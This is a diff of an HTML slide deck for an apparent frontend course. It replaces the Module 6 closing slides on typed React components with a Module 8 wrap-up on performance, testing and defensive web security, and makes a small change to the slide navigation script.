-      <tr><td><b>Button</b></td><td><code>ComponentProps&lt;'button'&gt; &amp; { variant }</code></td><td>Every native attribute and the ref, one place for styles</td></tr>
-      <tr><td><b>Select&lt;T&gt;</b></td><td><code>options</code>, <code>value</code>, <code>getKey</code>, <code>getLabel</code></td><td>T inferred from options; <code>onChange</code> hands back a T</td></tr>
-      <tr><td><b>useRequest&lt;T&gt;</b></td><td><code>(key, load) =&gt; RequestState&lt;T&gt;</code></td><td>Loading, error or success — stale requests aborted</td></tr>
-    </table>
-    <pre style="max-width:none; font-size:14.5px"><code><span class="kw">type</span> <span class="ty">RequestState</span>&lt;<span class="ty">T</span>&gt; = { status: <span class="st">'loading'</span> } | { status: <span class="st">'error'</span>; error: <span class="ty">ApiError</span> } | { status: <span class="st">'success'</span>; data: <span class="ty">T</span> };
-<span class="kw">function</span> <span class="fn">ListingPage</span>({ id }: { id: <span class="ty">string</span> }) {
-  <span class="kw">const</span> req = <span class="fn">useRequest</span>(id, (signal) =&gt; <span class="fn">getListing</span>(id, signal));   <span class="cmt">// RequestState&lt;Listing&gt;</span>
-  <span class="kw">switch</span> (req.status) {
-    <span class="kw">case</span> <span class="st">'loading'</span>: <span class="kw">return</span> &lt;<span class="ty">Spinner</span> /&gt;;
-    <span class="kw">case</span> <span class="st">'error'</span>:   <span class="kw">return</span> &lt;<span class="ty">ErrorBanner</span> error={req.error} /&gt;;   <span class="cmt">// “Try again” only if retryable</span>
-    <span class="kw">case</span> <span class="st">'success'</span>: <span class="kw">return</span> &lt;<span class="ty">ListingDetail</span> listing={req.data} /&gt;;
-  }
-}</code></pre>
-    <div class="key g" style="max-width:none"><b>Build · stage <span class="mono">module-6/typed-components</span></b> — the typed API layer plus these three, wired into the listings page.</div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 4</div><div class="cx-page"><b>17</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 4 · Read next</div>
-    <h2>The boundary, and what crosses it</h2>
-    <div class="two">
-      <div class="card a">
-        <h3 class="cy">References</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://zod.dev" target="_blank" rel="noopener">Zod</a><small>parse every response at the boundary</small></li>
-          <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" target="_blank" rel="noopener">Using the Fetch API — MDN</a><small>what fetch does and doesn&#x27;t throw on</small></li>
-          <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/ok" target="_blank" rel="noopener">Response.ok — MDN</a><small>a 404 resolves; your client has to check</small></li>
-        </ul>
-      </div>
-      <div class="card b">
-        <h3 class="b">Resources</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://github.com/Catalystsw/frontend-mastery-jobboard" target="_blank" rel="noopener">Rasmi — the job board repo</a><small>where the typed primitives land</small></li>
-          <li><a href="https://github.com/Catalystsw/frontend-mastery-program/tree/main/modules/06-react-typescript" target="_blank" rel="noopener">Module 6 slides</a><small>the deck this video walks through</small></li>
-        </ul>
-      </div>
-    </div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 4</div><div class="cx-page"><b>18</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Module 06 · done</div>
-    <h2>Components a reviewer can read</h2>
+  <!-- CLOSING -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 6"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 6</div><div class="cx-page"><b>23</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Module 08 · done</div>
+    <h2>Fast, tested and safe, with the proof</h2>
     <div class="two">
       <div class="card a">
         <h3 class="cy">What you can now do</h3>
         <ul class="plist" style="margin-top:4px">
-          <li>Write a component contract<small>props from the element, <code>ReactNode</code> children, refs as props, typed events</small></li>
-          <li>Build one generic component for every option type<small><code>Select&lt;T&gt;</code> inferred at the call site — and know when two components beat <code>as</code></small></li>
-          <li>Replace boolean soup with a state machine<small>union state, union actions, an exhaustive reducer, hooks that return named objects</small></li>
-          <li>Put one typed door in front of the network<small><code>apiGet</code> + Zod, <code>ApiError</code> with <code>retryable</code>, a function per endpoint</small></li>
+          <li>Read LCP, INP and CLS, in the lab and the field<small>and say which tool answers which question</small></li>
+          <li>Shrink a bundle, and stop images and fonts shifting<small>a treemap, <code>lazy()</code>, sized images, matched fallbacks</small></li>
+          <li>Prove a render fix with the profiler<small>memo only where the number moves</small></li>
+          <li>Test behaviour, not implementation<small>Testing Library, MSW at the network, Playwright for the journey</small></li>
+          <li>Close XSS, CSRF and token theft<small>sanitise, use HttpOnly cookies, ship a nonce-based CSP</small></li>
         </ul>
       </div>
-      <div>
-        <div class="card g">
-          <h3 class="g">Deliverable</h3>
-          <p>Stage <code>module-6/typed-components</code>: <code>Button</code>, <code>Select&lt;T&gt;</code> and <code>useRequest&lt;T&gt;</code> on top of a typed API layer — the base every later module of Rasmi builds on.</p>
-        </div>
-        <div class="card b" style="margin-top:18px">
-          <h3 class="b">Next · Module 07 — UI Engineering: Components &amp; Accessibility</h3>
-          <p>The components an interviewer asks for live — keyboard-driven, ARIA-correct, built on these primitives.</p>
-        </div>
+      <div class="card b">
+        <h3 class="b">Next · Module 09 — Frontend System Design</h3>
+        <p><b>A 45-minute design round, run to a script.</b> Requirements, architecture, data and interfaces, then optimizations, and that last part is where this module's numbers come in.</p>
+        <p style="margin-top:10px">Deliverable before you start: <code>module-8/perf-and-tests</code> green, with your before/after table in the PR.</p>
       </div>
     </div>
 </section>
@@ -804,7 +980,7 @@
     else if(k==='f'){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen();}
     else if(k==='p'){slides.forEach(s=>s.querySelectorAll('.frag').forEach(el=>el.classList.add('on')));window.print();}
   });
-  document.getElementById('stage').addEventListener('click',e=>{ if(e.target.closest('a')) return; e.clientX>innerWidth/2?next():prev(); });
+  document.getElementById('stage').addEventListener('click',e=>{ e.clientX>innerWidth/2?next():prev(); });
   render();
 </script>
 <!--catalyst-brand:copy-->
